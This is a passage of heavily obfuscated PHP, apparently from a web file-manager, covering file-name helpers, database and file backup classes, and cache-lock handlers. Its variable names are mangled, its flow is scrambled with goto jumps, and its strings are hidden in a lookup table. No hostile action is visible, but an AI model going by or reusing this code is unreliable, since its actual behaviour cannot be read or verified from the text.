$d„©ŞˆÛÆ¨ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E¥Ù”ê¬ = $d„©ŞˆÛÆ¨[1941] . $aİØÌ‘›ˆÒ . $d„©ŞˆÛÆ¨[70] . $C¥ƒôæÀ±; $cé¶Ñ¶í¯ = Cache::get($E¥Ù”ê¬); goto F­È´ÍÕã²; aÕªĞõÍ¿: $bÁÆä·çÈ = array(); $bÁÆä·çÈ[$d„©ŞˆÛÆ¨[1942]] = array($d„©ŞˆÛÆ¨[1943] => LNG($d„©ŞˆÛÆ¨[1942]), $d„©ŞˆÛÆ¨[1944] => $this->where($e«…ÃÒàÀå)->count(), $d„©ŞˆÛÆ¨[537] => $this->where($e«…ÃÒàÀå)->sum($d„©ŞˆÛÆ¨[77])); $B ç§â±ÔÚ = KodIO::fileTypeList(); goto c¦ì¼×®À”; b¹½Èˆ•: } public function fileNameExist($FÆßí‘ß, $C•ì’íßÁÀ) { $bÇàìƒ´Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¢Úëã”ñ = $this->childList($FÆßí‘ß); foreach ($A¢Úëã”ñ as $cÛóŸÌÎ–Á) { if ($cÛóŸÌÎ–Á[$bÇàìƒ´Ë[28]] == $C•ì’íßÁÀ) { return $cÛóŸÌÎ–Á[$bÇàìƒ´Ë[385]]; } if (strtolower($cÛóŸÌÎ–Á[$bÇàìƒ´Ë[28]]) == strtolower($C•ì’íßÁÀ)) { return $cÛóŸÌÎ–Á[$bÇàìƒ´Ë[385]]; } } return !1; } public function childList($EŸ¹ë§ˆÇİ) { goto c¢»²¨íõˆ; c¢»²¨íõˆ: $Fù”Á‚åÏ„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a±šâÁêÂ± = $Fù”Á‚åÏ„[1921] . $EŸ¹ë§ˆÇİ; if (isset(self::$cacheChildList[$a±šâÁêÂ±])) { return self::$cacheChildList[$a±šâÁêÂ±]; } goto B„©‚Ÿ›ˆ–; fÀÈÌ§ğŒ: self::$cacheChildList[$a±šâÁêÂ±] = $c‘«“»¦”Ü; foreach ($c‘«“»¦”Ü as $FÚ¹Åˆ£ƒø) { $a±šâÁêÂ± = $Fù”Á‚åÏ„[426] . $FÚ¹Åˆ£ƒø[$Fù”Á‚åÏ„[385]]; self::$cacheSourceInfo[$a±šâÁêÂ±] = $FÚ¹Åˆ£ƒø; } return $c‘«“»¦”Ü; goto dŸÑÇØ·Õ«; B„©‚Ÿ›ˆ–: $b³Ä´ŠÓÕ´ = array($Fù”Á‚åÏ„[478] => intval($EŸ¹ë§ˆÇİ), $Fù”Á‚åÏ„[413] => 0); $c‘«“»¦”Ü = $this->where($b³Ä´ŠÓÕ´)->select(); $c‘«“»¦”Ü = $c‘«“»¦”Ü ? $c‘«“»¦”Ü : array(); goto fÀÈÌ§ğŒ; dŸÑÇØ·Õ«: } public function fileNameAuto($dÓïåôÜº‰, $d¼İåòŠïÇ, $B¢Ó÷á¹ÁÍ = REPEAT_RENAME, $aÔùã„‚ = false) { $aÜ©­¢¦’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CŠŠ›ÚåÁ¦ = $this->childList($dÓïåôÜº‰); $EÈÅ¥øÉº‘ = array_to_keyvalue($CŠŠ›ÚåÁ¦, $aÜ©­¢¦’[33], $aÜ©­¢¦’[28]); return $this->fileNameAutoGet($EÈÅ¥øÉº‘, $d¼İåòŠïÇ, $B¢Ó÷á¹ÁÍ, $aÔùã„‚); } public function fileNameAutoGet($e¸ùç–¹ÆÙ, $Fø¢¾½æÀ, $c•¢ ºôÇŸ, $A¼Ğ­ ó”‘) { $a×¤–Œ¹‘· =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($c•¢ ºôÇŸ == REPEAT_REPLACE || !$e¸ùç–¹ÆÙ || !in_array_not_case($Fø¢¾½æÀ, $e¸ùç–¹ÆÙ) || $A¼Ğ­ ó”‘ && $c•¢ ºôÇŸ != REPEAT_RENAME_FOLDER) { return $Fø¢¾½æÀ; } if ($c•¢ ºôÇŸ == REPEAT_SKIP) { return !1; } $dÇ®ôó¾º = $a×¤–Œ¹‘·[91] . get_path_ext($Fø¢¾½æÀ); $dÇ®ôó¾º = $dÇ®ôó¾º == $a×¤–Œ¹‘·[91] || $A¼Ğ­ ó”‘ ? $a×¤–Œ¹‘·[33] : $dÇ®ôó¾º; for ($D¿ÙøëÆ×ö = 1; $D¿ÙøëÆ×ö <= count($e¸ùç–¹ÆÙ) + 1; $D¿ÙøëÆ×ö++) { $F‚µ©Šö‹¤ = substr($Fø¢¾½æÀ, 0, strlen($Fø¢¾½æÀ) - strlen($dÇ®ôó¾º)); $f“ÌÀîŒí = $F‚µ©Šö‹¤ . "\x28{$D¿ÙøëÆ×ö}\x29{$dÇ®ôó¾º}"; if (!in_array_not_case($f“ÌÀîŒí, $e¸ùç–¹ÆÙ)) { return $f“ÌÀîŒí; } } } } goto f¨¶–„¬É; D·ÇÆ§Ô: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $C«ášá¨Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; self::$name = date($C«ášá¨Œ[695]); if (!($fæø¥»Ê´Á = Model($C«ášá¨Œ[696])->lastItem())) { $fæø¥»Ê´Á = $this->initData(); } else { self::$name = $fæø¥»Ê´Á[$C«ášá¨Œ[28]]; if ($fæø¥»Ê´Á[$C«ášá¨Œ[697]] == $C«ášá¨Œ[83]) { self::$name = date($C«ášá¨Œ[698]); $f îÎŞÌÒ = 0; if (isset($fæø¥»Ê´Á[$C«ášá¨Œ[287]][$C«ášá¨Œ[171]][$C«ášá¨Œ[435]])) { $f îÎŞÌÒ = (int) $fæø¥»Ê´Á[$C«ášá¨Œ[287]][$C«ášá¨Œ[171]][$C«ášá¨Œ[435]]; } if ($fæø¥»Ê´Á[$C«ášá¨Œ[28]] == self::$name) { Model($C«ášá¨Œ[696])->remove($fæø¥»Ê´Á[$C«ášá¨Œ[383]]); } $fæø¥»Ê´Á = $this->initData($f îÎŞÌÒ, $fæø¥»Ê´Á[$C«ášá¨Œ[699]]); } else { $this->checkStore($fæø¥»Ê´Á[$C«ášá¨Œ[699]]); } } self::$option = $fæø¥»Ê´Á; } private function initData($EÅ³½©“Ò¼ = 0, $cœÀÒ„¾•¸ = '') { goto F½ˆÊÊæéÀ; Eè¸’œ“ÔÊ: $this->checkStore($c•¡Ğ¯µ¼[$a•ê‰ö™ í[699]]); $f™ÆôèÏ“Â = array($a•ê‰ö™ í[699] => $c•¡Ğ¯µ¼[$a•ê‰ö™ í[699]], $a•ê‰ö™ í[28] => self::$name, $a•ê‰ö™ í[697] => 0, $a•ê‰ö™ í[700] => $c•¡Ğ¯µ¼[$a•ê‰ö™ í[700]], $a•ê‰ö™ í[287] => array($a•ê‰ö™ í[701] => array($a•ê‰ö™ í[697] => 0), $a•ê‰ö™ í[702] => array($a•ê‰ö™ í[697] => 0, $a•ê‰ö™ í[703] => 0, $a•ê‰ö™ í[704] => 0, $a•ê‰ö™ í[29] => $a•ê‰ö™ í[33]), $a•ê‰ö™ í[705] => array($a•ê‰ö™ í[697] => 0, $a•ê‰ö™ í[703] => 0, $a•ê‰ö™ í[704] => 0), $a•ê‰ö™ í[171] => array($a•ê‰ö™ í[697] => 0, $a•ê‰ö™ í[706] => 0, $a•ê‰ö™ í[707] => 0, $a•ê‰ö™ í[708] => 0, $a•ê‰ö™ í[709] => 0, $a•ê‰ö™ í[435] => $EÅ³½©“Ò¼)), $a•ê‰ö™ í[710] => time(), $a•ê‰ö™ í[464] => 0); $C±Ù°ÊÄë = Model($a•ê‰ö™ í[696])->insert($f™ÆôèÏ“Â); goto f°ÑÂ Ä¤; f°ÑÂ Ä¤: $f™ÆôèÏ“Â[$a•ê‰ö™ í[383]] = $C±Ù°ÊÄë; return $f™ÆôèÏ“Â; goto b© îòª„»; F½ˆÊÊæéÀ: $a•ê‰ö™ í =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c•¡Ğ¯µ¼ = Model($a•ê‰ö™ í[696])->config(); if ($cœÀÒ„¾•¸ && $c•¡Ğ¯µ¼[$a•ê‰ö™ í[699]] != $cœÀÒ„¾•¸) { $EÅ³½©“Ò¼ = 0; } goto Eè¸’œ“ÔÊ; b© îòª„»: } private function checkStore($A•½½œ»ÌÂ) { $fª‹ìåÔí =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dƒË‰ÖŸà = Model($fª‹ìåÔí[711])->listData($A•½½œ»ÌÂ); Model($fª‹ìåÔí[711])->checkConfig($dƒË‰ÖŸà); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÈİÅ¿ÈÈ¥×][696])->findByName(self::$name); } return self::$option; } public static function set($Fµ¼Ï‘‹) { $aö¯éã–¼¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cñãŠ©ëÜ = self::get(); foreach ($Fµ¼Ï‘‹ as $aÈÁâ§·À… => $aÀ¢Ø†ß«ƒ) { $dç—‹…Üîç = explode($aö¯éã–¼¥[91], $aÈÁâ§·À…); $C™ÁòÓã = count($dç—‹…Üîç); switch ($C™ÁòÓã) { case 1: $cñãŠ©ëÜ[$dç—‹…Üîç[0]] = $aÀ¢Ø†ß«ƒ; break; case 2: $cñãŠ©ëÜ[$dç—‹…Üîç[0]][$dç—‹…Üîç[1]] = $aÀ¢Ø†ß«ƒ; break; case 3: $cñãŠ©ëÜ[$dç—‹…Üîç[0]][$dç—‹…Üîç[1]][$dç—‹…Üîç[2]] = $aÀ¢Ø†ß«ƒ; break; } } Model($aö¯éã–¼¥[696])->update($cñãŠ©ëÜ[$aö¯éã–¼¥[383]], $cñãŠ©ëÜ); self::$option = $cñãŠ©ëÜ; return self::$option; } public function keep() { $C¥­ªùÖÔ› =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AËŸÌèáù = self::get(); if ($AËŸÌèáù[$C¥­ªùÖÔ›[287]][$C¥­ªùÖÔ›[701]][$C¥­ªùÖÔ›[697]] == $C¥­ªùÖÔ›[83]) { return; } $this->backupKeep($AËŸÌèáù); self::set(array($C¥­ªùÖÔ›[712] => 1)); } private function backupKeep($cÓ™ø¼‘÷) { goto E¤î—‘îåÖ; bì‰¦ä£: $AÆÕ®Ñë† = 0; $FÚÍ×Ã®›Ñ = array(); foreach ($EÚÃ¦Àî¾ as $A«Æ…§ã) { if ($AÆÕ®Ñë† >= 7) { break; } $FÚÍ×Ã®›Ñ[] = $A«Æ…§ã[$Dè·¶­Ô¡Æ[28]]; $AÆÕ®Ñë†++; } goto Aá÷†˜ÜÙ; Aá÷†˜ÜÙ: for ($AÆÕ®Ñë† = 0; $AÆÕ®Ñë† < 12; $AÆÕ®Ñë†++) { $FÚÍ×Ã®›Ñ[] = date($Dè·¶­Ô¡Æ[713], strtotime("\55{$AÆÕ®Ñë†}\x20\x6d\x6f\x6e\164\150\163")); } $FÚÍ×Ã®›Ñ = array_unique($FÚÍ×Ã®›Ñ); foreach ($EÚÃ¦Àî¾ as $A«Æ…§ã) { if (!empty($A«Æ…§ã[$Dè·¶­Ô¡Æ[28]]) && in_array($A«Æ…§ã[$Dè·¶­Ô¡Æ[28]], $FÚÍ×Ã®›Ñ)) { continue; } Model($Dè·¶­Ô¡Æ[696])->remove($A«Æ…§ã[$Dè·¶­Ô¡Æ[383]]); $c½ªçÃ¦¤¥ = "\173\151\x6f\x3a{$cÓ™ø¼‘÷[$Dè·¶­Ô¡Æ[699]]}\175\x2f\x64\141\x74\x61\142\141\163\x65\x2f\142\141\x63\153\165\x70\x5f{$A«Æ…§ã[$Dè·¶­Ô¡Æ[28]]}"; IO::remove($c½ªçÃ¦¤¥, !1); } goto b¯ïèóĞö; E¤î—‘îåÖ: $Dè·¶­Ô¡Æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÚÃ¦Àî¾ = Model($Dè·¶­Ô¡Æ[696])->listData(); if (empty($EÚÃ¦Àî¾)) { return; } goto bì‰¦ä£; b¯ïèóĞö: } public function db() { goto CÄ è³Š¥‰; e¯¬•­Èª : $cÅµÙ¿ˆ¢Á = new BackupDb(); if (!$cÅµÙ¿ˆ¢Á->index()) { return !1; } self::set(array($aàë»ª×ğ•[714] => 1)); goto d¸ÌÕ×¤½¹; CÄ è³Š¥‰: $aàë»ª×ğ• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A ‰ÍğºŒ = self::get(); if ($A ‰ÍğºŒ[$aàë»ª×ğ•[287]][$aàë»ª×ğ•[702]][$aàë»ª×ğ•[697]] == $aàë»ª×ğ•[83]) { return !0; } goto e¯¬•­Èª ; d¸ÌÕ×¤½¹: return !0; goto cØŠÅ’½’ì; cØŠÅ’½’ì: } public function dbFile() { goto fìÙÅ¶í¹œ; fìÙÅ¶í¹œ: $FôÉ®¢Åğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E”•ÆŸ¥ = self::get(); if ($E”•ÆŸ¥[$FôÉ®¢Åğ[287]][$FôÉ®¢Åğ[705]][$FôÉ®¢Åğ[697]] == $FôÉ®¢Åğ[83]) { return !0; } goto AµÅà‡Îí„; D¾ŒáÂšî: return !0; goto eöšØ†¥ø; AµÅà‡Îí„: $eø‡Í¾ÉèÓ = new BackupDbFile(); if (!$eø‡Í¾ÉèÓ->index()) { return !1; } self::set(array($FôÉ®¢Åğ[715] => 1)); goto D¾ŒáÂšî; eöšØ†¥ø: } public function file() { $E‡Ù™¦Áç³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÎÜ½ê = self::get(); if ($eÎÜ½ê[$E‡Ù™¦Áç³[287]][$E‡Ù™¦Áç³[171]][$E‡Ù™¦Áç³[697]] == $E‡Ù™¦Áç³[83]) { return !0; } if (!isset($eÎÜ½ê[$E‡Ù™¦Áç³[700]]) || $eÎÜ½ê[$E‡Ù™¦Áç³[700]] == $E‡Ù™¦Áç³[485]) { $cíÆµñ³÷Õ = new BackupFile(); if (!$cíÆµñ³÷Õ->index()) { return !1; } } self::set(array($E‡Ù™¦Áç³[716] => 1, $E‡Ù™¦Áç³[697] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E¬ğ£¼áæè; a’­­¡³‹ç: Backup::set($BÕä¾éĞ«”); if ($fèšãŞÒ‡ > $BÒ±½õÚæ«) { return !1; } return !0; goto BÜ†ã«’ê—; bê£ğ¾¾çõ: foreach ($b‚Ë³¼ÃŸ as $E¾¬™Ç„¿) { $FäÊì¥¹âØ = $eøÌê¼ğ˜ . $E¾¬™Ç„¿ . $e–„»¸é‹[725]; $EÚ©ˆµöİŞ = null; if ($E¾¬™Ç„¿ == $e–„»¸é‹[726] && (!isset($AåìÄ¯øì[$e–„»¸é‹[700]]) || $AåìÄ¯øì[$e–„»¸é‹[700]] == $e–„»¸é‹[485])) { $EÚ©ˆµöİŞ = self::$io; } $BÒ±½õÚæ« += $A¥ŞÒœ»™Ş->sqlFromDb($E¾¬™Ç„¿, $FäÊì¥¹âØ, $E·Í¸•ÈéÅ, $EÚ©ˆµöİŞ); } $E·Í¸•ÈéÅ->end(); $BÕä¾éĞ«” = array($e–„»¸é‹[727] => $c»Õ³ÇˆÂ, $e–„»¸é‹[714] => 1, $e–„»¸é‹[728] => $fèšãŞÒ‡ + 1, $e–„»¸é‹[729] => $BÒ±½õÚæ«); goto a’­­¡³‹ç; eÑÒÎ³µ¸: self::$name = $AåìÄ¯øì[$e–„»¸é‹[28]]; $F†å§™‚Š = $GLOBALS[$e–„»¸é‹[6]][$e–„»¸é‹[17]]; $c»Õ³ÇˆÂ = $this->_dbType($F†å§™‚Š); goto b¸·è ÒÂƒ; E¬ğ£¼áæè: $e–„»¸é‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AåìÄ¯øì = Backup::get(); self::$io = $AåìÄ¯øì[$e–„»¸é‹[699]]; goto eÑÒÎ³µ¸; b¸·è ÒÂƒ: $A¥ŞÒœ»™Ş = new DbManage($F†å§™‚Š, $c»Õ³ÇˆÂ); $eøÌê¼ğ˜ = TEMP_FILES . $e–„»¸é‹[717] . self::$name . $e–„»¸é‹[8]; del_dir($eøÌê¼ğ˜); goto DÀÍäóË ; C´ÄÙÔÓ: $b‚Ë³¼ÃŸ = array_diff($b‚Ë³¼ÃŸ, array($e–„»¸é‹[718], $e–„»¸é‹[719])); foreach ($b‚Ë³¼ÃŸ as $E¾¬™Ç„¿) { $fèšãŞÒ‡ += $A¥ŞÒœ»™Ş->model($E¾¬™Ç„¿)->count(); } $E·Í¸•ÈéÅ = new Task($e–„»¸é‹[720], $e–„»¸é‹[721], $fèšãŞÒ‡, LNG($e–„»¸é‹[722]) . $e–„»¸é‹[723] . LNG($e–„»¸é‹[724])); goto bê£ğ¾¾çõ; DÀÍäóË : mk_dir($eøÌê¼ğ˜); $fèšãŞÒ‡ = $BÒ±½õÚæ« = 0; try { $b‚Ë³¼ÃŸ = $A¥ŞÒœ»™Ş->db()->getTables(); } catch (Exception $E—³”ï‰¯Ş) { return !1; } goto C´ÄÙÔÓ; BÜ†ã«’ê—: } private function _dbType($Dø½Äì´å) { goto bÅ½ÃÜèß´; bÅ½ÃÜèß´: $eµõ¾Ä¹è =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dø½Äì´å = array_change_key_case($Dø½Äì´å); $FÃ¸Ş‘´‡ = $Dø½Äì´å[$eµõ¾Ä¹è[730]]; goto bôÀªĞßÂÍ; bôÀªĞßÂÍ: if ($FÃ¸Ş‘´‡ == $eµõ¾Ä¹è[731]) { $eÔîë™É²³ = explode($eµõ¾Ä¹è[4], $Dø½Äì´å[$eµõ¾Ä¹è[732]]); $FÃ¸Ş‘´‡ = $eÔîë™É²³[0]; } $fÏö…ğø = array($eµõ¾Ä¹è[733] => $eµõ¾Ä¹è[9], $eµõ¾Ä¹è[734] => $eµõ¾Ä¹è[735]); if (isset($fÏö…ğø[$FÃ¸Ş‘´‡])) { $FÃ¸Ş‘´‡ = $fÏö…ğø[$FÃ¸Ş‘´‡]; } goto c›†æ‚£Š¹; c›†æ‚£Š¹: return $FÃ¸Ş‘´‡; goto cƒì Â¥ç; cƒì Â¥ç: } } class BackupDbFile { public function __construct() { } public function index() { goto dñ…æ¾ëÀ¾; E¸±¨¾å¿: if (!$e¥Ã´®¡¸â) { return !1; } Backup::set(array($fÜ„÷…Ö[736] => $e¥Ã´®¡¸â)); $Fºˆê©¨Ñ = new TaskFileTransfer($fÜ„÷…Ö[737], $fÜ„÷…Ö[721], count($dÁÓãç¦ò¢), LNG($fÜ„÷…Ö[722]) . $fÜ„÷…Ö[428] . LNG($fÜ„÷…Ö[724]) . $fÜ„÷…Ö[738]); goto EŠ›¡†‰ïã; bÛ×ÒºŒ–¸: $Fºˆê©¨Ñ->end(); Backup::set(array($fÜ„÷…Ö[741] => $e¥Ã´®¡¸â)); return !0; goto DÎŠÒø¡Ñò; C…Ş¶ƒêå—: $e‹¦·Ó½·Ï = CONTROLLER_DIR . $fÜ„÷…Ö[740]; IO::copy($Eİ•©íë», $e´¢ÙœœŠ„); IO::copy($e‹¦·Ó½·Ï, $e´¢ÙœœŠ„); goto bÛ×ÒºŒ–¸; BÇë¶Š«““: $BæÎøÒ— Ä = TEMP_FILES . "\142\x61\143\x6b\x75\160\137{$F†¬²«…Ûà}\x2f"; $e´¢ÙœœŠ„ = "\173\151\157\72{$cğíîÀãÉ[$fÜ„÷…Ö[699]]}\x7d\x2f\144\x61\164\x61\142\x61\163\x65\x2f\x62\x61\143\x6b\x75\160\137{$F†¬²«…Ûà}\57"; if (!($e´¢ÙœœŠ„ = IO::mkdir($e´¢ÙœœŠ„))) { return !1; } goto BäÂ›ÙÍø; BäÂ›ÙÍø: $CÌ‡–¨’óÊ = IO::listPath($BæÎøÒ— Ä); $dÁÓãç¦ò¢ = isset($CÌ‡–¨’óÊ[$fÜ„÷…Ö[73]]) ? $CÌ‡–¨’óÊ[$fÜ„÷…Ö[73]] : array(); $e¥Ã´®¡¸â = array_sum(array_column($dÁÓãç¦ò¢, $fÜ„÷…Ö[77])); goto E¸±¨¾å¿; dñ…æ¾ëÀ¾: $fÜ„÷…Ö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cğíîÀãÉ = Backup::get(); $F†¬²«…Ûà = $cğíîÀãÉ[$fÜ„÷…Ö[28]]; goto BÇë¶Š«““; EŠ›¡†‰ïã: $Fºˆê©¨Ñ->task[$fÜ„÷…Ö[706]] = $e¥Ã´®¡¸â; foreach ($CÌ‡–¨’óÊ[$fÜ„÷…Ö[73]] as $eÑÊ·Æİ) { $E÷¥ÁÇĞ‚ï = IO::move($eÑÊ·Æİ[$fÜ„÷…Ö[75]], $e´¢ÙœœŠ„); if (!$E÷¥ÁÇĞ‚ï) { $Fºˆê©¨Ñ->end(); return !1; } } $Eİ•©íë» = CONTROLLER_DIR . $fÜ„÷…Ö[739]; goto C…Ş¶ƒêå—; DÎŠÒø¡Ñò: } } goto bÀœàä›Â; E†¹ïİ²ÎÄ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C¤®¬äÁô; E±öÔÙåœ£: self::$timeout = $dçµôŞ¸ä´[$aå…”Œæ¶º[774]] ? $dçµôŞ¸ä´[$aå…”Œæ¶º[774]] : 10; $A§ß¥œ—Ææ = _get($GLOBALS[$aå…”Œæ¶º[6]], $aå…”Œæ¶º[775]); $C­µÔ¸ªƒ = $dçµôŞ¸ä´[$aå…”Œæ¶º[761]] ? $dçµôŞ¸ä´[$aå…”Œæ¶º[761]] : $aå…”Œæ¶º[171]; goto D‹ÒïŸÖ; D‹ÒïŸÖ: if ($C­µÔ¸ªƒ == $aå…”Œæ¶º[17] && $A§ß¥œ—Ææ == $aå…”Œæ¶º[9]) { $C­µÔ¸ªƒ = $aå…”Œæ¶º[171]; } switch ($C­µÔ¸ªƒ) { case $aå…”Œæ¶º[764]: self::$handle = new CacheLockRedis(); break; case $aå…”Œæ¶º[765]: self::$handle = new CacheLockMemcached(); break; case $aå…”Œæ¶º[17]: self::$handle = new CacheLockDatabase(); break; case $aå…”Œæ¶º[171]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Bàñ½ãµ†—; C¤®¬äÁô: $aå…”Œæ¶º =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::$handle) { return self::$handle; } $dçµôŞ¸ä´ = $GLOBALS[$aå…”Œæ¶º[6]][$aå…”Œæ¶º[343]]; goto E±öÔÙåœ£; Bàñ½ãµ†—: } private static function key($C±ô¹†Óô¤) { return $_SERVER[ÈİÅ¿ÈÈ¥×][776] . Cache::key($C±ô¹†Óô¤); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BÄŞŸÌêª = '') { self::$errorMsg = $BÄŞŸÌêª; } public static function lockGlobal($c‡Ä¬æ¾·Ê, $a«‚»‚Û¾÷) { return self::lock($c‡Ä¬æ¾·Ê, $a«‚»‚Û¾÷, !0); } public static function lock($dê½ÊƒŒ›ß, $d¶™¶š¨  = false, $e›À÷ÜÃèŒ = false) { goto AöªÍÛƒ†; E—²ÓÜíõ: $d¶™¶š¨  = $d¶™¶š¨  ? $d¶™¶š¨  : self::$timeout; $c†ÈÀĞ¹ä½ = $Bˆ†©¬œÁ¹->lock($dËåá¢ö¼Ø, $d¶™¶š¨ ); if (!$c†ÈÀĞ¹ä½) { $a˜»ÍÇË = "\x6c\157\143\153\x20\x65\x72\x72\157\x72\x3b\x6b\145\171\75{$dËåá¢ö¼Ø}\73\x74\151\155\x65\75{$d¶™¶š¨ }\73" . self::$errorMsg . $D¼«¦µã“[67] . get_caller_msg(); $b³ğ¬Û·“¬ = LNG($D¼«¦µã“[777]) . "\50{$d¶™¶š¨ }\163\54{$dËåá¢ö¼Ø}\51\41\12" . LNG($D¼«¦µã“[778]); $b³ğ¬Û·“¬ .= $D¼«¦µã“[779]; if (is_string(self::$errorMsg) && self::$errorMsg) { $b³ğ¬Û·“¬ = $b³ğ¬Û·“¬ . $D¼«¦µã“[780] . self::$errorMsg; } write_log($a˜»ÍÇË, $D¼«¦µã“[781]); show_json($b³ğ¬Û·“¬, !1); } goto C¼¦§¯«í; C¼¦§¯«í: if (!$e›À÷ÜÃèŒ) { self::$lockItem[$dËåá¢ö¼Ø] = !0; } return $c†ÈÀĞ¹ä½; goto aÙ ƒ£˜…‹; AöªÍÛƒ†: $D¼«¦µã“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bˆ†©¬œÁ¹ = self::init(); $dËåá¢ö¼Ø = self::key($dê½ÊƒŒ›ß); goto E—²ÓÜíõ; aÙ ƒ£˜…‹: } public static function lockGet($dƒ©‹ˆ°©) { $F”ÁÃÒÅ´Ó = self::key($dƒ©‹ˆ°©); if (self::$lockItem[$F”ÁÃÒÅ´Ó]) { return self::$lockItem[$F”ÁÃÒÅ´Ó]; } return self::init()->lockGet($F”ÁÃÒÅ´Ó); } public static function unlock($dˆ‘„ ä„) { $c¼¸®…áë = self::key($dˆ‘„ ä„); self::$lockItem[$c¼¸®…áë] = null; return self::init()->unlock($c¼¸®…áë); } public static function unlockRuntime() { $FÕ›ÃÇÕ´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Ağ’ëñ›ÍŸ = self::init(); $CÚ©ÄŞ‚™… = !1; foreach (self::$lockItem as $eÖ‰œ…¬•£ => $eÉ¢ò—ÈÄ­) { if (!$eÉ¢ò—ÈÄ­) { continue; } $Ağ’ëñ›ÍŸ->unlock($eÖ‰œ…¬•£); if (!$CÚ©ÄŞ‚™…) { $CÚ©ÄŞ‚™… = !0; write_log($FÕ›ÃÇÕ´[782] . $eÖ‰œ…¬•£ . $FÕ›ÃÇÕ´[67] . get_caller_msg(), $FÕ›ÃÇÕ´[781]); continue; } write_log($FÕ›ÃÇÕ´[782] . $eÖ‰œ…¬•£, $FÕ›ÃÇÕ´[781]); } self::fileUnlockAll(); } public static function fileLock($F´¿¦†Î—) { goto D¬‹ç—º’İ; AÂ†§¶¤­: $A©ä¤ˆïå¾ = fopen(DATA_PATH . $F´¿¦†Î— . $BÄÌÊãÏÑ[784], $BÄÌÊãÏÑ[785]); if (!$A©ä¤ˆïå¾) { return !1; } $GLOBALS[$BÄÌÊãÏÑ[783]][$F´¿¦†Î—] = $A©ä¤ˆïå¾; goto FŸŸÏ¤˜»Ì; D¬‹ç—º’İ: $BÄÌÊãÏÑ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$GLOBALS[$BÄÌÊãÏÑ[783]]) { $GLOBALS[$BÄÌÊãÏÑ[783]] = array(); } $GLOBALS[$BÄÌÊãÏÑ[783]][$F´¿¦†Î—] = !1; goto AÂ†§¶¤­; FŸŸÏ¤˜»Ì: if (flock($A©ä¤ˆïå¾, LOCK_EX)) { return !0; } self::unlock($F´¿¦†Î—); show_json($BÄÌÊãÏÑ[786], !1); goto e»‘•‚ìÌÈ; e»‘•‚ìÌÈ: return !1; goto fæ¶ØÒˆÜ’; fæ¶ØÒˆÜ’: } public static function fileUnlock($B‡İáƒ¢÷Ú) { $EËÁ½¨Ö— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÍÊœ‡× = $GLOBALS[$EËÁ½¨Ö—[783]][$B‡İáƒ¢÷Ú]; if (!$dÍÊœ‡×) { return; } $GLOBALS[$EËÁ½¨Ö—[783]][$B‡İáƒ¢÷Ú] = !1; flock($dÍÊœ‡×, LOCK_UN); fclose($dÍÊœ‡×); } public static function fileUnlockAll() { $FÉå¹˜ğÑ× =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$GLOBALS[$FÉå¹˜ğÑ×[783]]) { return; } foreach ($GLOBALS[$FÉå¹˜ğÑ×[783]] as $DİÀ´¤ËµÜ => $CÜÏ…È¢Õâ) { if (!$CÜÏ…È¢Õâ) { continue; } $GLOBALS[$FÉå¹˜ğÑ×[783]][$DİÀ´¤ËµÜ] = !1; flock($CÜÏ…È¢Õâ, LOCK_UN); fclose($CÜÏ…È¢Õâ); } $GLOBALS[$FÉå¹˜ğÑ×[783]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $EŸÏ¥ÛƒĞ¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E¾¢áÆã¥¦ = $GLOBALS[$EŸÏ¥ÛƒĞ¼[6]][$EŸÏ¥ÛƒĞ¼[343]]; self::$cachePath = $E¾¢áÆã¥¦[$EŸÏ¥ÛƒĞ¼[171]][$EŸÏ¥ÛƒĞ¼[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($aìóøÈÊÊõ, $FƒÔ·¬˜Ñ = 0) { goto a¬‡çÜÄ¨“; EĞÙ—ÔÚâ¼: $eÈ®Ÿ¾¦¥º = rtrim(self::$cachePath, $c è·Å‹ì˜[8]) . $c è·Å‹ì˜[787] . md5($aìóøÈÊÊõ) . $c è·Å‹ì˜[784]; if (file_exists($eÈ®Ÿ¾¦¥º) && filemtime($eÈ®Ÿ¾¦¥º) && filemtime($eÈ®Ÿ¾¦¥º) < time() - 10) { @unlink($eÈ®Ÿ¾¦¥º); } do { if (file_exists($eÈ®Ÿ¾¦¥º)) { cacheLockWait(); continue; } $cÃ…£òš†‚ = fopen($eÈ®Ÿ¾¦¥º, $c è·Å‹ì˜[788]); if (!$cÃ…£òš†‚) { return !1; } $FàŸï½æœè = flock($cÃ…£òš†‚, LOCK_EX | LOCK_NB); self::$caches[$aìóøÈÊÊõ] = array($c è·Å‹ì˜[789] => $cÃ…£òš†‚, $c è·Å‹ì˜[171] => $eÈ®Ÿ¾¦¥º); fwrite($cÃ…£òš†‚, $BĞ‘ÈåºÂå); 